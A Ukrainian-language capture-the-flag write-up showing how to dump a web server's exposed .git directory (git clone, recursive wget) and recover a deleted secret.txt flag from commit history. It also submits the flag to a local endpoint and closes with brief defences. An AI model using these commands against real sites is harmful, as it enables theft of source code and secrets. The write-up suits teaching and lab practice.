# Task2 — Writeup: витік через відкритий `.git`

## Суть задачі
Вебсервер віддає директорію **`.git`**. У репозиторії колись існував файл `secret.txt` з флагом, потім його видалили, але він **залишився в історії комітів**. Потрібно відновити флаг з git-історії та відправити його на бекенд.

---

## Перевірка вразливості
1. Відкрий:
- `http://localhost:8080/`
2. Перевір доступність `.git`:
- `http://localhost:8080/.git/`

Ознаки, що все “як треба” для розв’язку:
- видно листинг каталогу `.git`, або
- віддаються файли на кшталт `.git/HEAD`, `.git/config`, `.git/logs/HEAD`, `.git/objects/...`.

---

## Варіанти розв’язку

### Варіант 1 — `git clone` напряму (якщо доступний “dumb HTTP”)
Якщо сервер віддає `.git/info/refs` і об’єкти, можна клонувати репозиторій напряму:

```bash
git clone http://localhost:8080/.git/ leaked-repo
cd leaked-repo
git log --oneline --all
git log --all -- secret.txt
git show <commit_hash>:secret.txt
```

Після отримання флага відправ його через API:
```bash
curl -s -X POST http://localhost:8080/submit   -H "Content-Type: application/json"   -d '{"flag":"flag{...}"}'
```

---

### Варіант 2 — скачати `.git` рекурсивно (wget/curl), потім зібрати репо локально
Якщо `git clone` не працює, але `.git` віддається файлами/листингом — качаємо `.git` як звичайні файли.

#### 2.1. Через `wget`
```bash
mkdir -p task2_dump && cd task2_dump
wget -r -np -nH --cut-dirs=0 -R "index.html*" http://localhost:8080/.git/
```

> За потреби перевір, що витягнулись `objects/`, `refs/`, `logs/`.

#### 2.2. Зібрати репозиторій
```bash
mkdir -p repo
mv .git repo/.git
cd repo
git reset --hard
```

#### 2.3. Дістати флаг
```bash
git log --oneline --all
git log --all -- secret.txt
git show <commit_hash>:secret.txt
```

Відправка флага:
```bash
curl -s -X POST http://localhost:8080/submit   -H "Content-Type: application/json"   -d '{"flag":"flag{...}"}'
```

---

### Варіант 3 — знайти флаг пошуком по всій історії (без знання файла)
Якщо назва файла не очевидна (або хочеш швидко знайти `flag{`):

```bash
git rev-list --all | while read c; do
  git grep -n "flag{" "$c" && echo "FOUND in $c" && break
done
```

Або разово:
```bash
git grep -n "flag{" $(git rev-list --all)
```

Після знаходження:
```bash
git show <commit_hash>:<path_to_file>
```

---

### Варіант 4 — відновити `secret.txt` у робоче дерево з минулого коміту
Замість `git show` можна фізично витягнути файл:

```bash
git checkout <commit_hash> -- secret.txt
cat secret.txt
```

---

## Здача флага
- Через UI: `http://localhost:8080/` → вставити флаг у форму → Submit.
- Через API:
```bash
curl -s -X POST http://localhost:8080/submit   -H "Content-Type: application/json"   -d '{"flag":"flag{...}"}'
```

Очікувано: `{"success":true,...}`.

---

## Чому це працює
- Git зберігає “снапшоти” файлів у комітах.
- Видалення файла в новому коміті **не видаляє** його з попередніх комітів.
- Якщо `.git` доступний ззовні, атакувальник може відновити репозиторій і витягти дані.

---

## Захист (коротко)
- Заборонити доступ до `/.git` на рівні вебсервера.
- Вимкнути directory listing.
- Не комітити секрети; якщо вже сталося — чистити історію + ротувати секрети.
